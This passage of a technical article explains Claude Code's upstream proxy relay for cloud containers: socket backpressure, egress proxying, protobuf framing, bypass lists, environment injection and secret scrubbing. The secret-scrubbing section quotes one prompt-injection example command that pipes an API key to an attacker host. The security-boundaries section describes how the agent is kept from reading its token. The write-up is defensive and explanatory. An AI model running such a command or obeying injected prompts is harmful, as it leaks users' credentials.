+<p>Bun provides <code>Bun.listen()</code>, a callback-based TCP server where each connection gets an <code>open</code>, <code>data</code>, <code>drain</code>, <code>close</code>, and <code>error</code> handler. Connection state is stored directly on the socket’s <code>data</code> property — no external map needed.</p>
+<p>The critical difference is <strong>write backpressure</strong>. When you call <code>sock.write(bytes)</code> in Bun, it returns the number of bytes actually written to the kernel buffer. If the buffer is full, it returns less than the full length. The remaining bytes are <strong>silently dropped</strong> — Bun does not auto-buffer them.</p>
+<p>The relay handles this with an explicit write queue per connection:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function bunWrite(socket, state, payload):</span></span>
+<span class="line"><span>    bytes = toBytes(payload)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # If there's already a backlog, just queue</span></span>
+<span class="line"><span>    if state.writeBuf is not empty:</span></span>
+<span class="line"><span>        state.writeBuf.push(bytes)</span></span>
+<span class="line"><span>        return</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Try writing directly</span></span>
+<span class="line"><span>    n = socket.write(bytes)</span></span>
+<span class="line"><span>    if n &#x3C; bytes.length:</span></span>
+<span class="line"><span>        # Partial write — queue the remainder</span></span>
+<span class="line"><span>        state.writeBuf.push(bytes[n:])</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># When the kernel buffer drains, Bun calls drain()</span></span>
+<span class="line"><span>function drain(socket):</span></span>
+<span class="line"><span>    while state.writeBuf is not empty:</span></span>
+<span class="line"><span>        chunk = state.writeBuf[0]</span></span>
+<span class="line"><span>        n = socket.write(chunk)</span></span>
+<span class="line"><span>        if n &#x3C; chunk.length:</span></span>
+<span class="line"><span>            state.writeBuf[0] = chunk[n:]</span></span>
+<span class="line"><span>            return  # still full, wait for next drain</span></span>
+<span class="line"><span>        state.writeBuf.shift()</span></span></code></pre>
+<p>Without this, a fast upstream server sending data faster than the client can consume would silently lose bytes mid-TLS-stream — corrupting the connection with no error message.</p>
+<h3 id="the-node-path">The Node Path</h3>
+<p>Node’s <code>net.createServer()</code> takes a connection callback. Each connection is a <code>Socket</code> object with event emitters. Connection state is stored in a <code>WeakMap</code> keyed by the socket — when the socket is garbage-collected, the state goes with it.</p>
+<p>Node’s <code>sock.write()</code> is fundamentally different from Bun’s: it <strong>always buffers</strong>. If the kernel buffer is full, <code>write()</code> returns <code>false</code> to signal backpressure, but the bytes are already queued internally. They will be flushed when the buffer drains. No explicit write queue is needed.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Node path: write() auto-buffers, never drops bytes</span></span>
+<span class="line"><span>adapter = {</span></span>
+<span class="line"><span>    write: (payload) -> socket.write(toBuffer(payload)),</span></span>
+<span class="line"><span>    end: () -> socket.end()</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>This is why the relay has two implementations rather than one: the core CONNECT parsing and WebSocket tunneling logic is shared (via <code>handleData</code> and <code>openTunnel</code>), but the TCP I/O layer has different correctness requirements. A single abstraction would either waste memory in Node (unnecessary write queue) or lose bytes in Bun (missing write queue).</p>
+<h3 id="the-egress-proxy-problem">The Egress Proxy Problem</h3>
+<p>The CCR container sits behind an egress gateway — direct outbound connections are blocked. This creates a chicken-and-egg problem: the relay needs to open a WebSocket to the cloud gateway, but the WebSocket connection itself must go through the egress proxy.</p>
+<p>Node’s <code>undici.WebSocket</code> (the <code>globalThis.WebSocket</code> in Node) does <strong>not</strong> consult the global dispatcher for upgrade requests. So even though the process has <code>HTTPS_PROXY</code> configured, the WebSocket wouldn’t use it. The relay works around this by using the <code>ws</code> package with an explicit proxy agent:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Node path: preload ws package, pass explicit agent</span></span>
+<span class="line"><span>WS = require("ws")</span></span>
+<span class="line"><span>ws = new WS(wsUrl, {</span></span>
+<span class="line"><span>    headers: { "Content-Type": "application/proto", Authorization: bearerToken },</span></span>
+<span class="line"><span>    agent: getWebSocketProxyAgent(wsUrl),  # CONNECT through egress proxy</span></span>
+<span class="line"><span>    tls: getWebSocketTLSOptions()          # mTLS certs if configured</span></span>
+<span class="line"><span>})</span></span></code></pre>
+<p>The <code>ws</code> package is preloaded during <code>startNodeRelay()</code> — before any connection arrives — so that <code>openTunnel()</code> stays synchronous. If the <code>import('ws')</code> happened inside <code>openTunnel</code>, the CONNECT state machine would race: a second data event could fire while the import was awaiting, and the state would be inconsistent.</p>
+<p>Bun’s native <code>WebSocket</code> accepts a <code>proxy</code> URL directly as a constructor option — no agent needed. It also accepts a <code>tls</code> option for custom certificates. The Bun path is simpler because the runtime was designed for this:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Bun path: proxy and TLS as constructor options</span></span>
+<span class="line"><span>ws = new WebSocket(wsUrl, {</span></span>
+<span class="line"><span>    headers: { "Content-Type": "application/proto", Authorization: bearerToken },</span></span>
+<span class="line"><span>    proxy: getWebSocketProxyUrl(wsUrl),   # string, not an agent</span></span>
+<span class="line"><span>    tls: getWebSocketTLSOptions()</span></span>
+<span class="line"><span>})</span></span></code></pre>
+<p>Both paths honor mTLS configuration (client certificates set via <code>CLAUDE_CODE_CLIENT_CERT</code> and <code>CLAUDE_CODE_CLIENT_KEY</code>), so the relay works in enterprise environments that require mutual TLS for all outbound connections.</p>
+<hr>
+<h2 id="the-protobuf-wire-format">The Protobuf Wire Format</h2>
+<p>Bytes between the relay and gateway are wrapped in protobuf messages:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>message UpstreamProxyChunk {</span></span>
+<span class="line"><span>    bytes data = 1;</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>The encoding is hand-written — no protobuf library, no code generation:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function encodeChunk(data):</span></span>
+<span class="line"><span>    # Protobuf field 1, wire type 2 (length-delimited) → tag byte 0x0a</span></span>
+<span class="line"><span>    # Tag = (field_number &#x3C;&#x3C; 3) | wire_type = (1 &#x3C;&#x3C; 3) | 2 = 10 = 0x0a</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Varint-encode the length</span></span>
+<span class="line"><span>    varint = []</span></span>
+<span class="line"><span>    n = data.length</span></span>
+<span class="line"><span>    while n > 0x7f:</span></span>
+<span class="line"><span>        varint.push((n &#x26; 0x7f) | 0x80)</span></span>
+<span class="line"><span>        n = n >>> 7</span></span>
+<span class="line"><span>    varint.push(n)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Assemble: [0x0a] [varint length] [data bytes]</span></span>
+<span class="line"><span>    out = new bytes(1 + varint.length + data.length)</span></span>
+<span class="line"><span>    out[0] = 0x0a</span></span>
+<span class="line"><span>    out[1..] = varint</span></span>
+<span class="line"><span>    out[1+varint.length..] = data</span></span>
+<span class="line"><span>    return out</span></span></code></pre>
+<p>Decoding is the reverse: verify the 0x0a tag, read the varint length, extract the payload. A shift exceeding 28 bits is rejected (guards against malformed varints). Zero-length chunks are valid (keepalive semantics).</p>
+<p>Why hand-encode instead of using protobufjs? For a single-field bytes message, the hand encoding is 10 lines of code. A protobuf runtime library adds a dependency in the hot path — every byte of subprocess traffic passes through this encoder. The trade-off is clear: minimal code, no dependency, maximum throughput.</p>
+<p>Large payloads are chunked at 512KB boundaries before encoding. This matches the Envoy per-request buffer cap at the gateway. Week-1 use cases (Datadog API calls) won’t hit this limit, but the chunking is designed for future workloads like <code>git push</code> that could send megabytes through the tunnel.</p>
+<hr>
+<h2 id="the-no_proxy-bypass-list">The NO_PROXY Bypass List</h2>
+<p>Not all traffic should go through the proxy. The bypass list is carefully curated:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>NO_PROXY = [</span></span>
+<span class="line"><span>    # Loopback</span></span>
+<span class="line"><span>    "localhost", "127.0.0.1", "::1",</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # RFC1918 private ranges + AWS IMDS</span></span>
+<span class="line"><span>    "169.254.0.0/16", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Anthropic API — three forms for cross-runtime compatibility</span></span>
+<span class="line"><span>    "anthropic.com", ".anthropic.com", "*.anthropic.com",</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # GitHub (already reachable directly from CCR containers)</span></span>
+<span class="line"><span>    "github.com", "api.github.com", "*.github.com", "*.githubusercontent.com",</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Package registries</span></span>
+<span class="line"><span>    "registry.npmjs.org", "pypi.org", "files.pythonhosted.org",</span></span>
+<span class="line"><span>    "index.crates.io", "proxy.golang.org"</span></span>
+<span class="line"><span>]</span></span></code></pre>
+<h3 id="why-three-forms-for-anthropic">Why Three Forms for Anthropic?</h3>
+<p>Different runtimes parse NO_PROXY differently:</p>
+<ul>
+<li><code>*.anthropic.com</code> — Bun, curl, and Go interpret <code>*</code> as a glob wildcard</li>
+<li><code>.anthropic.com</code> — Python urllib/httpx treats a leading dot as a suffix match (strips the dot, matches <code>*.anthropic.com</code>)</li>
+<li><code>anthropic.com</code> — Apex domain fallback for runtimes that don’t handle the above</li>
+</ul>
+<p>All three are needed to cover the ecosystem of tools subprocesses might use.</p>
+<h3 id="why-bypass-the-anthropic-api">Why Bypass the Anthropic API?</h3>
+<p>The comment in the source is blunt: “the MITM breaks non-Bun runtimes.” The proxy’s MITM certificate is trusted by the merged CA bundle, but not all runtimes use <code>SSL_CERT_FILE</code>. Python’s <code>certifi</code> package bundles its own CA store and ignores environment variables unless explicitly configured. A MITM’d connection to the Anthropic API from a Python subprocess would fail with <code>CERTIFICATE_VERIFY_FAILED</code>.</p>
+<p>More importantly, the Anthropic API is Claude Code’s own backend. There’s no need for credential injection or traffic inspection on this path — the CLI already has its own authentication. Routing it through the proxy would add latency and failure modes for no benefit.</p>
+<h3 id="why-bypass-package-registries">Why Bypass Package Registries?</h3>
+<p>CCR containers already have direct network access to npm, PyPI, crates.io, and Go’s module proxy. Routing package installs through the upstream proxy would add latency to <code>npm install</code> and <code>pip install</code> — commands the model runs frequently — for no security benefit. The registries don’t need org credentials injected.</p>
+<hr>
+<h2 id="subprocess-environment-injection">Subprocess Environment Injection</h2>
+<p>The final layer connects everything. Every subprocess Claude Code spawns gets environment variables injected:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function subprocessEnv():</span></span>
+<span class="line"><span>    # Get proxy vars (empty if proxy disabled or not in CCR)</span></span>
+<span class="line"><span>    proxyEnv = getUpstreamProxyEnv()</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # If GHA secret scrubbing is enabled, strip sensitive vars</span></span>
+<span class="line"><span>    if env.CLAUDE_CODE_SUBPROCESS_ENV_SCRUB:</span></span>
+<span class="line"><span>        env = copy(process.env)</span></span>
+<span class="line"><span>        env.merge(proxyEnv)</span></span>
+<span class="line"><span>        for key in SCRUB_LIST:</span></span>
+<span class="line"><span>            delete env[key]</span></span>
+<span class="line"><span>            delete env["INPUT_" + key]  # GHA auto-creates INPUT_&#x3C;NAME></span></span>
+<span class="line"><span>        return env</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Normal case: process.env + proxy overlay</span></span>
+<span class="line"><span>    return merge(process.env, proxyEnv)</span></span></code></pre>
+<p>The proxy env function is registered lazily. The <code>subprocessEnv</code> module has no static import of the upstream proxy module — this is deliberate. In non-CCR environments (local CLI, IDE integration), the proxy module graph (upstreamproxy + relay + WebSocket + FFI) is never loaded. The registration happens in <code>init</code> only when <code>CLAUDE_CODE_REMOTE</code> is set:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># In init, only when running in CCR:</span></span>
+<span class="line"><span>registerUpstreamProxyEnvFn(getUpstreamProxyEnv)</span></span>
+<span class="line"><span>initUpstreamProxy()</span></span></code></pre>
+<h3 id="the-gha-secret-scrubbing-layer">The GHA Secret Scrubbing Layer</h3>
+<p>When running in GitHub Actions, a separate threat applies: prompt injection can exfiltrate secrets via shell expansion. A malicious prompt could trick the model into running <code>echo $ANTHROPIC_API_KEY | curl attacker.com -d @-</code>. The subprocess environment scrubber removes 20+ sensitive variables:</p>
+<ul>
+<li><strong>Anthropic auth</strong>: API keys, OAuth tokens, custom headers</li>
+<li><strong>Cloud provider creds</strong>: AWS secret keys, GCP credentials, Azure client secrets</li>
+<li><strong>GitHub Actions OIDC tokens</strong>: Leaking these allows minting installation tokens — repo takeover</li>
+<li><strong>Actions runtime tokens</strong>: Cache poisoning via artifact/cache API — supply-chain pivot</li>
+<li><strong>OTEL headers</strong>: Often carry <code>Authorization: Bearer</code> tokens for monitoring backends</li>
+</ul>
+<p>The scrub list explicitly does NOT include <code>GITHUB_TOKEN</code> and <code>GH_TOKEN</code>. These are job-scoped tokens that expire when the workflow ends. Wrapper scripts need them to call the GitHub API, and their short lifetime limits the blast radius.</p>
+<p>The <code>INPUT_*</code> variant deletion handles a GitHub Actions quirk: the <code>with:</code> inputs in a workflow step are auto-duplicated as <code>INPUT_&#x3C;NAME></code> environment variables. <code>INPUT_ANTHROPIC_API_KEY</code> would survive the scrub of <code>ANTHROPIC_API_KEY</code> without this.</p>
+<h3 id="child-cli-inheritance">Child CLI Inheritance</h3>
+<p>When Claude Code spawns a child CLI process (e.g., a subagent), the child can’t re-initialize the relay — the token file was already unlinked. But the parent’s relay is still running on localhost. The <code>getUpstreamProxyEnv</code> function detects this case:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function getUpstreamProxyEnv():</span></span>
+<span class="line"><span>    if proxy not initialized locally:</span></span>
+<span class="line"><span>        # Check if we inherited proxy vars from a parent process</span></span>
+<span class="line"><span>        if env.HTTPS_PROXY and env.SSL_CERT_FILE are both set:</span></span>
+<span class="line"><span>            # Pass through parent's proxy configuration</span></span>
+<span class="line"><span>            return inherited proxy vars</span></span>
+<span class="line"><span>        return {}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # We own the relay — return our vars</span></span>
+<span class="line"><span>    return {</span></span>
+<span class="line"><span>        HTTPS_PROXY: "http://127.0.0.1:&#x3C;port>",</span></span>
+<span class="line"><span>        https_proxy: "http://127.0.0.1:&#x3C;port>",</span></span>
+<span class="line"><span>        NO_PROXY: &#x3C;bypass list>,</span></span>
+<span class="line"><span>        no_proxy: &#x3C;bypass list>,</span></span>
+<span class="line"><span>        SSL_CERT_FILE: "~/.ccr/ca-bundle.crt",</span></span>
+<span class="line"><span>        NODE_EXTRA_CA_CERTS: "~/.ccr/ca-bundle.crt",</span></span>
+<span class="line"><span>        REQUESTS_CA_BUNDLE: "~/.ccr/ca-bundle.crt",</span></span>
+<span class="line"><span>        CURL_CA_BUNDLE: "~/.ccr/ca-bundle.crt",</span></span>
+<span class="line"><span>    }</span></span></code></pre>
+<p>Both lowercase and uppercase variants are set for each variable. Some tools read <code>https_proxy</code>, others <code>HTTPS_PROXY</code>. Setting both ensures universal coverage.</p>
+<p>Only HTTPS is proxied. The relay handles CONNECT (which is exclusively for HTTPS tunneling) and nothing else. Plain HTTP has no credentials to inject, and routing it through the relay would just produce a 405 error.</p>
+<hr>
+<h2 id="security-boundaries">Security Boundaries</h2>
+<p>The upstream proxy operates at the intersection of several trust boundaries:</p>
+<p><strong>The model can’t read the token.</strong> The file is unlinked before the agent loop starts. The heap is non-dumpable. The token never appears in environment variables.</p>
+<p><strong>Subprocesses can’t reach arbitrary endpoints.</strong> Traffic goes through the gateway, which can enforce allowlists and inject org credentials. The NO_PROXY list ensures local and already-authorized traffic bypasses the gateway.</p>
+<p><strong>The proxy env vars are classified as dangerous.</strong> In Claude Code’s environment variable security model, <code>HTTPS_PROXY</code>, <code>SSL_CERT_FILE</code>, and <code>NODE_EXTRA_CA_CERTS</code> are NOT in the safe-vars list. Project-level settings files (<code>.claude/settings.json</code>) can’t set them without a trust dialog — a malicious project could otherwise redirect traffic to an attacker’s proxy and supply an attacker’s CA certificate, enabling MITM of all subprocess HTTPS traffic. Only the upstream proxy system and user-level config can set them.</p>
+<p><strong>Initialization fails open but fails loudly.</strong> Every failure path logs a warning with the specific error. The session continues without the proxy, so users aren’t blocked. But the debug logs make it clear why subprocess traffic isn’t being proxied.</p>
+<hr>
+<h2 id="design-trade-offs">Design Trade-offs</h2>
+<p>Several design decisions in the upstream proxy system reveal the constraints it operates under.</p>
+<h3 id="why-fail-open-everywhere">Why Fail-Open Everywhere?</h3>
+<p>Every step of initialization — gate checks, token read, CA download, relay bind, prctl — fails open. If any step errors, the proxy is disabled and the session continues without it. This is the opposite of how most security systems work, where failure means “deny access.”</p>
+<p>The reasoning: the upstream proxy is an <strong>infrastructure enhancement</strong>, not a security gate. Its purpose is to inject credentials and log traffic for organizations. A session without the proxy still works — the agent can’t reach org-internal services through the proxy, but it can still do everything else. Blocking the entire session because a CA endpoint was temporarily unreachable would be an availability regression for a feature the user didn’t directly ask for.</p>
+<p>The fail-open contract is maintained end-to-end. The <code>init</code> entry point wraps the entire <code>initUpstreamProxy()</code> call in a try-catch that logs and continues. Even if the module itself throws an unexpected error, the session starts.</p>
+<h3 id="why-no-test-suite">Why No Test Suite?</h3>
+<p>The upstream proxy has <strong>no dedicated test files</strong>. This is unusual for a security-sensitive component. The relay’s source even exports <code>startNodeRelay</code> specifically so tests can exercise the Node path under Bun (with a comment explaining this), and the upstream proxy module exports <code>resetUpstreamProxyForTests()</code> — the hooks are there, but no tests exist yet.</p>
+<p>The likely reason: the system is tightly coupled to infrastructure that’s hard to simulate. The relay needs a WebSocket endpoint that speaks protobuf and responds with CONNECT establishment. The CA download hits a real HTTP endpoint. The prctl call needs Linux. The token lifecycle depends on tmpfs. Each piece works correctly in production but is expensive to mock in isolation. This is a testing debt that the exported test hooks suggest the team intends to pay down.</p>
+<h3 id="why-hand-coded-protobuf-instead-of-grpc">Why Hand-Coded Protobuf Instead of gRPC?</h3>
+<p>The tunnel carries a single message type with a single bytes field. gRPC would add:</p>
+<ul>
+<li>A protobuf compiler step in the build pipeline</li>
+<li>A runtime library (~100KB+ for protobufjs)</li>
+<li>HTTP/2 framing that the L7 load balancer would need to support</li>
+<li>Code generation for a one-field message</li>
+</ul>
+<p>The hand-coded encoder is 10 lines. The decoder is 12 lines. Both are trivially auditable. The trade-off breaks clearly in favor of hand-coding for this specific use case.</p>
+<h3 id="why-lazy-module-loading">Why Lazy Module Loading?</h3>
+<p>The upstream proxy module graph includes WebSocket libraries, Bun FFI bindings, node:net, and the relay state machine. In non-CCR environments (local CLI, IDE integrations), none of this is needed. A static import would load it unconditionally — adding startup latency and memory overhead for every user, even though fewer than 1% run in CCR containers.</p>
+<p>The lazy-import pattern pushes this cost to zero for non-CCR users:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># In init, only when CLAUDE_CODE_REMOTE is set:</span></span>
+<span class="line"><span>proxy = await import("upstreamproxy")</span></span>
+<span class="line"><span>registerUpstreamProxyEnvFn(proxy.getUpstreamProxyEnv)</span></span>
+<span class="line"><span>await proxy.initUpstreamProxy()</span></span></code></pre>
+<p>The subprocess environment module cooperates: it holds a function reference (<code>_getUpstreamProxyEnv</code>) that defaults to undefined. In non-CCR sessions, it’s never registered, so <code>subprocessEnv()</code> returns <code>process.env</code> unmodified — no proxy module loaded, no overhead.</p>
+<h3 id="why-both-uppercase-and-lowercase-env-vars">Why Both Uppercase and Lowercase Env Vars?</h3>
+<p>The proxy sets both <code>HTTPS_PROXY</code> and <code>https_proxy</code>, both <code>NO_PROXY</code> and <code>no_proxy</code>. This isn’t redundant — it’s necessary. The ecosystem is split:</p>
+<ul>
+<li><strong>curl</strong> prefers lowercase, falls back to uppercase</li>
+<li><strong>Python requests</strong> checks uppercase first</li>
+<li><strong>Go’s net/http</strong> checks both, prefers <code>HTTPS_PROXY</code></li>
+<li><strong>Node.js</strong> (undici) checks lowercase first</li>
+<li><strong>Bun</strong> checks lowercase first</li>
+</ul>
+<p>Setting both ensures every tool in every runtime sees the proxy configuration without requiring users to set variables manually.</p>
+<hr>
+<h2 id="invisible-by-design">Invisible by Design</h2>
+<p>The upstream proxy has no user-facing UI. No status bar indicator. No toast notification. No <code>--show-proxy-status</code> flag. No React component renders proxy state.</p>
+<p>All proxy logging goes through a debug-only channel that writes to <code>~/.claude/debug/&#x3C;session-id>.txt</code>. Users only see these messages if they start the CLI with <code>--debug</code> or enable it mid-session with <code>/debug</code>. The messages are tagged <code>[upstreamproxy]</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[upstreamproxy] enabled on 127.0.0.1:49152</span></span>
+<span class="line"><span>[upstreamproxy] relay listening on 127.0.0.1:49152</span></span></code></pre>
+<p>Or on failure:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[upstreamproxy] no session token file; proxy disabled</span></span>
+<span class="line"><span>[upstreamproxy] ca-cert fetch 404; proxy disabled</span></span>
+<span class="line"><span>[upstreamproxy] relay start failed: EADDRINUSE; proxy disabled</span></span></code></pre>
+<p>The user can verify the proxy is active by checking environment variables inside a subprocess:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">env</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#9ECBFF"> HTTPS_PROXY</span><span style="color:#6A737D">   # http://127.0.0.1:&#x3C;port></span></span>
+<span class="line"><span style="color:#B392F0">env</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#9ECBFF"> SSL_CERT_FILE</span><span style="color:#6A737D">  # ~/.ccr/ca-bundle.crt</span></span></code></pre>
+<p>This invisibility is deliberate. The proxy is infrastructure plumbing for the container orchestrator, not a user feature. If it works, the user shouldn’t notice it. If it fails, the session continues without it and the debug log explains what happened.</p>
+<hr>
+<h2 id="the-full-round-trip">The Full Round-Trip</h2>
+<p>Here’s a single <code>curl</code> request traced through every function in the chain, from user action to response.</p>
+<p><strong>Step 0: Initialization</strong> (happens once at startup)</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>init()</span></span>
+<span class="line"><span>  → [lazy import upstreamproxy module]</span></span>
+<span class="line"><span>  → registerUpstreamProxyEnvFn(getUpstreamProxyEnv)</span></span>
+<span class="line"><span>  → initUpstreamProxy()</span></span>
+<span class="line"><span>    → isEnvTruthy("CLAUDE_CODE_REMOTE")         # gate 1</span></span>
+<span class="line"><span>    → isEnvTruthy("CCR_UPSTREAM_PROXY_ENABLED")  # gate 2</span></span>
+<span class="line"><span>    → readToken("/run/ccr/session_token")        # gate 3-4</span></span>
+<span class="line"><span>    → setNonDumpable()                           # prctl via Bun FFI</span></span>
+<span class="line"><span>    → downloadCaBundle(baseUrl, systemCaPath, outPath)</span></span>
+<span class="line"><span>    → startUpstreamProxyRelay({ wsUrl, sessionId, token })</span></span>
+<span class="line"><span>      → startBunRelay() or startNodeRelay()      # runtime dispatch</span></span>
+<span class="line"><span>    → registerCleanup(() => relay.stop())</span></span>
+<span class="line"><span>    → unlink(tokenPath)                          # token now heap-only</span></span></code></pre>
+<p><strong>Step 1: Model generates <code>curl https://api.datadog.com/v1/metrics</code></strong></p>
+<p>The Bash tool prepares to spawn the subprocess:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>BashTool.executeCommand(command)</span></span>
+<span class="line"><span>  → Shell.execute(command, { env: subprocessEnv(), ... })</span></span>
+<span class="line"><span>    → subprocessEnv()</span></span>
+<span class="line"><span>      → _getUpstreamProxyEnv()                   # registered function pointer</span></span>
+<span class="line"><span>        → getUpstreamProxyEnv()                   # returns { HTTPS_PROXY, SSL_CERT_FILE, ... }</span></span>
+<span class="line"><span>      → merge(process.env, proxyEnv)</span></span>
+<span class="line"><span>    → spawn(binary, args, { env: mergedEnv })</span></span></code></pre>
+<p>The child <code>curl</code> process inherits <code>HTTPS_PROXY=http://127.0.0.1:49152</code> and <code>SSL_CERT_FILE=~/.ccr/ca-bundle.crt</code>.</p>
+<p><strong>Step 2: curl sends CONNECT to the relay</strong></p>
+<p>curl reads <code>HTTPS_PROXY</code>, opens a TCP connection to <code>127.0.0.1:49152</code>, and sends:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>CONNECT api.datadog.com:443 HTTP/1.1</span></span>
+<span class="line"><span>Host: api.datadog.com:443</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>The relay’s TCP server fires:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[socket open]</span></span>
+<span class="line"><span>  → newConnState()                               # { connectBuf, pending, wsOpen, established, closed }</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[socket data: CONNECT header arrives]</span></span>
+<span class="line"><span>  → handleData(adapter, state, data, ...)</span></span>
+<span class="line"><span>    → Buffer.concat(state.connectBuf, data)</span></span>
+<span class="line"><span>    → indexOf("\r\n\r\n")                        # found at end of header</span></span>
+<span class="line"><span>    → regex match "CONNECT api.datadog.com:443 HTTP/1.1"</span></span>
+<span class="line"><span>    → stash trailing bytes in state.pending</span></span>
+<span class="line"><span>    → openTunnel(adapter, state, connectLine, ...)</span></span>
+<span class="line"><span>      → new WebSocket(wsUrl, { headers, proxy/agent, tls })</span></span></code></pre>
+<p><strong>Step 3: WebSocket opens, CONNECT line forwarded to gateway</strong></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ws.onopen()</span></span>
+<span class="line"><span>  → encodeChunk(head)                            # head = CONNECT line + Proxy-Authorization</span></span>
+<span class="line"><span>    → [0x0a, varint(length), ...bytes]           # protobuf wire encoding</span></span>
+<span class="line"><span>  → ws.send(encodedChunk)</span></span>
+<span class="line"><span>  → state.wsOpen = true</span></span>
+<span class="line"><span>  → flush state.pending                          # TLS ClientHello if coalesced</span></span>
+<span class="line"><span>    → forwardToWs(ws, buf)</span></span>
+<span class="line"><span>      → encodeChunk(slice) for each 512KB chunk</span></span>
+<span class="line"><span>      → ws.send(encodedChunk)</span></span>
+<span class="line"><span>  → setInterval(sendKeepalive, 30000, ws)</span></span></code></pre>
+<p><strong>Step 4: Gateway responds with 200, curl proceeds with TLS</strong></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ws.onmessage(event)</span></span>
+<span class="line"><span>  → decodeChunk(raw)                             # verify 0x0a tag, read varint, extract payload</span></span>
+<span class="line"><span>  → state.established = true                     # 502 boundary: no more plaintext errors</span></span>
+<span class="line"><span>  → adapter.write(payload)                       # "HTTP/1.1 200 Connection Established\r\n\r\n"</span></span></code></pre>
+<p>curl sees the 200, starts TLS handshake through the tunnel. Every subsequent data event follows the same path: <code>handleData</code> → <code>forwardToWs</code> → <code>encodeChunk</code> → <code>ws.send</code> (client to server), and <code>ws.onmessage</code> → <code>decodeChunk</code> → <code>adapter.write</code> (server to client).</p>
+<p><strong>Step 5: Cleanup when curl exits</strong></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[socket close]</span></span>
+<span class="line"><span>  → cleanupConn(state)</span></span>
+<span class="line"><span>    → clearInterval(state.pinger)                # stop keepalive</span></span>
+<span class="line"><span>    → state.ws.close()                           # close WebSocket</span></span>
+<span class="line"><span>    → state.ws = undefined</span></span></code></pre>
+<p><strong>Step 6: Session shutdown</strong></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>gracefulShutdown()</span></span>
+<span class="line"><span>  → runCleanupFunctions()</span></span>
+<span class="line"><span>    → relay.stop()                               # registered during init</span></span>
+<span class="line"><span>      → server.stop(true) [Bun] or server.close() [Node]</span></span></code></pre>
+<p>Every function in this chain is named. The total path from model output to subprocess response is: <code>BashTool.executeCommand</code> → <code>Shell.execute</code> → <code>subprocessEnv</code> → <code>getUpstreamProxyEnv</code> → <code>spawn</code> → [kernel TCP] → <code>handleData</code> → <code>openTunnel</code> → <code>encodeChunk</code> → [WebSocket] → [gateway] → <code>decodeChunk</code> → <code>adapter.write</code> → [kernel TCP] → curl.</p>
+<hr>
